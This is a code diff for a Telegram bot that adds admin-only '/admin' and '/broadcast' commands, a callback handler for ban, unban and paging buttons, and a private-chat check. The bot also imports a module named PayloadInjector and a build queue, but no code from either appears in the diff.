@@ -35,8 +35,12 @@ from modules.auth import UserManager, request_otp, verify_otp
 from modules.utils import cleanup_session
 from modules.queue_manager import build_queue
 from modules.payload_injector import PayloadInjector
+from modules.stats_manager import stats_manager
 from modules.telegram_logger import TelegramLogHandler
 from modules.admin_check import check_admin_status
+from modules.admin_panel import (
+    handle_admin_command, handle_admin_callback, handle_broadcast
+)
 
 os.makedirs('logs', exist_ok=True)
 os.makedirs('cache', exist_ok=True)
@@ -81,9 +85,23 @@ def generate_unique_filename(original_name):
 
 @bot.on(events.NewMessage)
 async def handler(event):
+    if not event.is_private:
+        return
+    
     user_id = event.sender_id
     message = event.message
-    if not event.is_private:
+    text = message.message.strip() if message.message else ""
+    
+    if text == '/admin':
+        if user_id not in ADMIN_USER_IDS:
+            return
+        await handle_admin_command(event, ADMIN_USER_IDS)
+        return
+    
+    if text.startswith('/broadcast '):
+        if user_id not in ADMIN_USER_IDS:
+            return
+        await handle_broadcast(event, ADMIN_USER_IDS, bot)
         return
 
     if message.document:
@@ -189,8 +207,6 @@ async def handler(event):
                 })
         return
 
-    text = message.message.strip() if message.message else ""
-
     if user_id in user_manager.waiting_otp:
         if text != '' and (text.startswith('/') or not (text.isdigit() and len(text) == 6)):
             del user_manager.waiting_otp[user_id]
@@ -258,6 +274,16 @@ async def handler(event):
             )
         else:
             await event.reply(f"❌ {msg}\n\nPlease try again")
+
+
+@bot.on(events.CallbackQuery)
+async def callback_handler(event):
+    user_id = event.sender_id
+    data = event.data.decode('utf-8')
+    
+    if data.startswith('admin:') or data.startswith('ban:') or data.startswith('unban:') or data.startswith('user_page:'):
+        await handle_admin_callback(event, bot, ADMIN_USER_IDS)
+        return
 
 
 async def process_build_queue():
